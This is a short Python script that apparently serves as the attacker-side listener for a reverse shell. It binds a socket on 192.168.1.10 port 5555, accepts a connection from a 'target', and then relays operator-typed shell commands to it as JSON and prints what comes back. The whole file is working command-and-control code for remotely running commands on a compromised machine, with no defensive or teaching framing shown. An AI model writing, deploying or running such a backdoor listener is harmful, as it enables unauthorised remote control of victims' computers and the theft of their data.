import socket 
import json


def reliable_send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())

def reliable_recv():
     data = ''
     while True:
          try:

               data = data + target.recv(1024).decode().rstrip()
               return json.loads(data)

          except ValueError:
               continue

def target_communication():

     while True:

          command = input('* Shell~%s: ' % str(ip))
          reliable_send(command)

          if command == 'quit':
               break
          
          else:
               result = reliable_recv()
               print(result)


sock0 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock0.bind(('192.168.1.10', 5555))

print('[+] ... Listening For The Incoming Connections')

sock0.listen(5)
target, ip = sock0.accept()

print('[+] Target Connected .. From: ' + str(ip))

target_communication()